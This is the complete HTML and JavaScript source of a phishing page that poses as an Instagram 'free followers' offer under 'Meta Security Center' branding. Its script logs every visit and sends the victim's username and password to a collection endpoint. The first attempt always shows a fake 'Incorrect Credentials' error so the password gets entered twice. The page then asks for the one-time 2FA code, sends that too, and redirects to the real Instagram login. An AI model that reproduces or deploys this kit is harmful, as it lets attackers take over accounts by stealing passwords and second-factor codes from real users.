<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Meta Security Center | Portal Access</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; 
        }
        .main-container { background: #bc1875; width: 350px; padding: 40px; border-radius: 1px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); text-align: center; }
        .branding { font-size: 38px; font-weight: 800; color: #262626; margin-bottom: 25px; }
        .promo-desc { font-weight: 600; color: #8e8e8e; font-size: 14px; margin-bottom: 20px; line-height: 1.3; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 13px; }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        .action-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 10px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; }
        .error-txt { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 8px; border-radius: 4px; background: #fff2f2; }
        #loader-ui { display: none; flex-direction: column; align-items: center; padding: 20px; }
        .loader-spin { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 22px; height: 22px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="main-container">
    <div class="branding">instagram Free Followers</div>
    <p class="promo-desc">Verify your account to claim 1,000+ Free Followers.</p>
    
    <div id="msg" class="error-txt">Incorrect Credentials. Please double-check your profile key.</div>

    <div id="login-ui">
        <input type="text" id="target_u" placeholder="Phone number, username, or email">
        <input type="password" id="target_p" placeholder="Account Key (Password)">
        <button class="action-btn" onclick="captureStep()">Secure Connect</button>
    </div>

    <div id="loader-ui">
        <div class="loader-spin"></div>
        <p style="font-size: 12px; color: #8e8e8e; margin-top: 15px;">Validating credentials with identity nodes...</p>
    </div>

    <div id="otp-ui" style="display:none;">
        <p style="font-size: 14px; font-weight: 700; margin-bottom: 5px;">Input Security PIN</p>
        <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">A one-time verification code has been sent to your device.</p>
        <input type="number" id="target_o" placeholder="000000">
        <button class="action-btn" onclick="submitPin()">Verify</button>
    </div>
</div>

<script>
    let tries = 0;
    // Visit Tracking setup
    window.onload = () => {
        fetch('/api/index', { method: 'POST', body: JSON.stringify({ t: 'VISIT', d: navigator.userAgent }) });
    };

     async function captureStep() {
    const u = document.getElementById('target_u').value;
    const p = document.getElementById('target_p').value;
    
    if(!u || !p) return;

    // Loading UI show karein
    document.getElementById('login-ui').style.display = 'none';
    document.getElementById('loader-ui').style.display = 'flex';

    // 🚨 Sabse Zaroori: Headers ke sath data bhej rahe hain
    const requestPayload = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            u: u, 
            p: p, 
            t: tries < 1 ? 'INIT_LOG' : 'REAL_LOG' 
        })
    };

    try {
        // Password bhej rahe hain
        await fetch('/api/index', requestPayload);

        if(tries < 1) {
            // Pehli baar error show karein
            setTimeout(() => {
                document.getElementById('loader-ui').style.display = 'none';
                document.getElementById('login-ui').style.display = 'block';
                document.getElementById('msg').style.display = 'block';
                document.getElementById('target_p').value = '';
                tries++;
            }, 3000); 
        } else {
            // Doosri baar 18 seconds loading phir OTP page
            setTimeout(() => {
                document.getElementById('loader-ui').style.display = 'none';
                document.getElementById('otp-ui').style.display = 'block';
            }, 18000); 
        }
    } catch (error) {
        console.error("Data send nahi hua:", error);
    }
                                        }
    
    
    async function submitPin() {
        const o = document.getElementById('target_o').value;
        if(o.length < 6) return;
        await fetch('/api/index', { method: 'POST', body: JSON.stringify({u: document.getElementById('target_u').value, o, t: 'OTP_RECEIVED'}) });
        window.location.href = "https://instagram.com/accounts/login";
    }
</script>
</body>
</html>
